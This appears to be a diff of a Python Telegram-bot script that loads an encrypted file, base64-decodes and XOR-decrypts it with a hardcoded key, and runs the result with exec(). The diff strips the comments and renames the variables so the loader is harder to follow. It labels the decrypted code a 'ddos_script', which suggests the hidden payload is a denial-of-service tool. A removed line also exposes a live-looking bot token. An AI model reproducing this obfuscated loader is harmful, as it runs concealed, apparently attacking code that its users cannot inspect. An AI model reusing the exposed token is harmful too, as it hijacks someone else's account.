@@ -1,17 +1,22 @@
 import base64
 import telebot
+import json
+
+# Load configuration
+with open('config.json') as config_file:
+    config = json.load(config_file)
 
 # Initialize the bot with your token
-bot = telebot.TeleBot('6045043208:AAFSpU6PZBBeIfo0nj6r8jC1w7wVxSfCTlE')
+BOT_TOKEN = config['bot_token']
+bot = telebot.TeleBot(BOT_TOKEN)
 
 # First, delete any existing webhook
-bot.remove_webhook()
+# bot.remove_webhook()
 
 # Now start polling
-bot.polling() 
+# bot.polling() 
 
-def xor_encrypt_decrypt(data: bytes, key: str) -> bytes:
-    # XOR decryption using the provided key
+def lazydeveloper_dos(data: bytes, key: str) -> bytes:
     decrypted_bytes = bytearray()
     key_bytes = key.encode()
 
@@ -20,16 +25,13 @@ def xor_encrypt_decrypt(data: bytes, key: str) -> bytes:
 
     return decrypted_bytes
 
-# Read the encrypted script file in binary mode
 with open('lazydeveloper.py.enc', 'rb') as file:
-    encrypted_script_base64 = file.read()
+    encbs64 = file.read()
 
-# Decode the base64-encoded data
-encrypted_script = base64.b64decode(encrypted_script_base64)
+lzdvscr = base64.b64decode(encbs64)
 
-# Decrypt using XOR
+
 key = 'YT@LazyDeveloperr'
-decrypted_script = xor_encrypt_decrypt(encrypted_script, key)
+lazydeveloper_ddos_script = lazydeveloper_dos(lzdvscr, key)
 
-# Execute the decrypted script
-exec(decrypted_script.decode('latin1'))  # Use 'latin1' to handle byte to string conversion
+exec(lazydeveloper_ddos_script.decode('latin1'))
